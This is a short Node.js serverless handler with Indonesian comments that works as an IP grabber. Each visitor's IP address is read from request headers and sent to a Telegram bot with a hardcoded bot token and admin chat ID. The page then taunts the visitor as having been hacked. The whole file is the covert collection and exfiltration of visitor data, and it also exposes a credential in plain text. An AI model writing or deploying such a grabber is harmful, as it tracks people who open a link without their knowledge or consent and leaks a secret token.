const axios = require('axios');

const BOT_TOKEN = "7974841762:AAE71EIGeWy6SN4H5wDbRLfQhdytxYWHfS0";
const ADMIN_ID = "8336285430";

module.exports = async (req, res) => {
  // Dapatkan IP visitor
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  console.log("Visitor IP:", ip);

  // Kirim ke Telegram
  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: ADMIN_ID,
      text: `🚀 Visitor baru! IP: ${ip}`
    });
  } catch (err) {
    console.log("Gagal kirim ke Telegram:", err.message);
  }

  res.status(200).send('<h1>mampus kena hek 🤣🗿</h1>');
};
